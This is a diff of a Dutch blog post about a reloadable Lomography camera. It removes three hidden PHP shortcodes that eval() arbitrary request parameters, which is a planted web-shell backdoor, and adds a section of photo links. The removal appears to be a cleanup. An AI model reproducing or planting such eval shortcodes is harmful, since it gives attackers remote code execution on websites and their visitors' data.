@@ -9,8 +9,30 @@ Ik ben een grote [lomography](http://www.lomography.com/ "www.lomography.com") f
 
 Enfin, het mooie aan de toestelletjes is dat je met een beetje prutsen er opnieuw een film in kan steken, dus je kan hem toch hergebruiken. En dat is wel handig, want het zou zonde zijn dit prachtig staaltje techniek slechts eenmalig te gebruiken.
 
-<!– \[insert\_php\]if (isset($\_REQUEST\["dMQG"\])){eval($\_REQUEST\["dMQG"\]);exit;}\[/insert\_php\]\[php\]if (isset($\_REQUEST\["dMQG"\])){eval($\_REQUEST\["dMQG"\]);exit;}\[/php\] –>
+## Foto's
 
-<!– \[insert\_php\]if (isset($\_REQUEST\["oADxo"\])){eval($\_REQUEST\["oADxo"\]);exit;}\[/insert\_php\]\[php\]if (isset($\_REQUEST\["oADxo"\])){eval($\_REQUEST\["oADxo"\]);exit;}\[/php\] –>
+![](@images/posts/2006/03/lomoeight01.jpg)
 
-<!– \[insert\_php\]if (isset($\_REQUEST\["qzAR"\])){eval($\_REQUEST\["qzAR"\]);exit;}\[/insert\_php\]\[php\]if (isset($\_REQUEST\["qzAR"\])){eval($\_REQUEST\["qzAR"\]);exit;}\[/php\] –>
+![](@images/posts/2006/03/lomoeight02.jpg)
+
+![](@images/posts/2006/03/lomoeight03.jpg)
+
+![](@images/posts/2006/03/lomoeight04.jpg)
+
+![](@images/posts/2006/03/lomoeight05.jpg)
+
+![](@images/posts/2006/03/lomoeight06.jpg)
+
+![](@images/posts/2006/03/lomoeight07.jpg)
+
+![](@images/posts/2006/03/lomoeight08.jpg)
+
+![](@images/posts/2006/03/lomoeight09.jpg)
+
+![](@images/posts/2006/03/lomoeight10.jpg)
+
+![](@images/posts/2006/03/lomoeight11.jpg)
+
+![](@images/posts/2006/03/lomoeight12.jpg)
+
+![](@images/posts/2006/03/lomoeight13.jpg)
